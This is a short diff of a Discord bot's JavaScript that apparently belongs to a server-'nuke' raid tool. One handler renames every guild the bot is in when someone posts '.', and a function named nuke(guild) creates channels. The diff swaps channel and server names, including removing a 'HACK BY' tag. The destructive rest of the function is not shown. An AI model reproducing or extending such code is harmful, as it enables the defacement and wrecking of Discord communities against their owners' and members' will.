@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(``)
+             m.setName('DAPERT BA GAN CHW')
 })
 }
 });
@@ -616,9 +616,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('CH NIA DNYA FSHAYA', 'text');
+    await guild.createChannel('LINK E SERVERA NUEYAKAT BNERA', 'text');
  
-      await guild.createChannel('HACK BY G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+      await guild.createChannel('Hazm le nia blem create server bka', 'voice');
  
  
  
